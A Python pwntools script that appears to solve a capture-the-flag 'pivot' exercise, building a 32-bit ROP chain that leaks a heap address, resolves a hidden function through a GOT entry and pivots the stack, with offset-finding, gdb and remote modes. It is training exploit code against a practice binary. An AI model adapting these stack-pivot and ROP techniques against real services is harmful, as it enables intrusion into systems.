import argparse
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# TODO: Change these if necessary
x64 = False
pattern_size = 100
should_log = True

def ff_to_overflow(p):
	# TODO: Change this function to navigate to the overflow.
	print p.recvuntil("pivot: ")
	addr = p.recvline().strip()
	print p.recvuntil("> ")
	return addr

def find_offset(p):
	log.info("Using {} byte pattern".format(pattern_size))
	ff_to_overflow(p)
	p.sendline(cyclic(pattern_size, n=8 if x64 else 4))
	p.interactive()
	return

def exploit(p, bin_fname, libc_fname):
	e = ELF(bin_fname)
	libc = ELF(libc_fname) if libc_fname else None

	"""
		Examples:

		func_offset = libc.symbols['puts'] 	# Offset in libc
		puts_addr = p32(e.got['puts'])
		main = e.symbols['main']
		addr_string = next(e.search('/bin/cat flag.txt'))
	"""

	# Read pivot address for second payload
	pivot_addr = int(ff_to_overflow(p), 16) # This address is in the heap

	# Call foothold function so that GOT entry is populated
	buf = p32(e.symbols['foothold_function'])

	# Fill $eax with GOT address
	pop_eax = 0x080488c0 # pop eax ; ret
	buf += p32(pop_eax)
	buf += p32(e.got['foothold_function'])

	# Fill $ebx with offset
	pop_ebx = 0x08048571 # pop ebx ; ret
	offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']
	buf += p32(pop_ebx)
	buf += p32(offset)

	# Set $eax = GOT[func] + offset
	buf += p32(0x80488c4) # mov    eax,DWORD PTR [eax]
	buf += p32(0x80488c7) # add    eax,ebx

	# Call new function
	buf += p32(0x080486a3) # call eax
	p.sendline(buf)

	# Send pivoting payload
	p.recvuntil("> ")
	buf = cyclic_find('laaa') * 'a'
	buf += p32(0x080488c0) # 0x080488c0 : pop eax ; ret
	buf += p32(pivot_addr)
	buf += p32(0x080488c2) # 0x080488c2 : xchg eax, esp ; ret

	p.sendline(buf)
	p.interactive()
	return

if __name__ == '__main__':

	# Remote service address/port
	IP = ''
	PORT = 0

	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("binary_name", help="Binary file name")
	parser.add_argument("-l", "--libc", help="libc file name")
	parser.add_argument("--offset", help="Find overflow offset", action="store_true")
	parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
	parser.add_argument("--nodebug", help="Run exploit without GDB", action="store_true")
	args = parser.parse_args()

	# Get file names
	bin_fname = args.binary_name
	libc_fname = args.libc

	# Run binary
	if args.remote:
		r = remote(IP, PORT)
		log.info("Running remote exploit...")
		exploit(r, bin_fname, libc_fname)
	else:
		p = process(bin_fname)
		log.info("Running local exploit...")
		gdb_cmd = [
			"b *0x80488a0",
			"b *0x8048896",
			"c"
		]

		# Use gdb.debug if it seems like the GDB commands aren't working.
		if not args.nodebug:
			p = gdb.debug(bin_fname, gdbscript="\n".join(gdb_cmd))
			# gdb.attach(p, gdbscript="\n".join(gdb_cmd))

		# Find offset or debug
		if args.offset:
			find_offset(p)
		else:
			exploit(p, bin_fname, libc_fname)
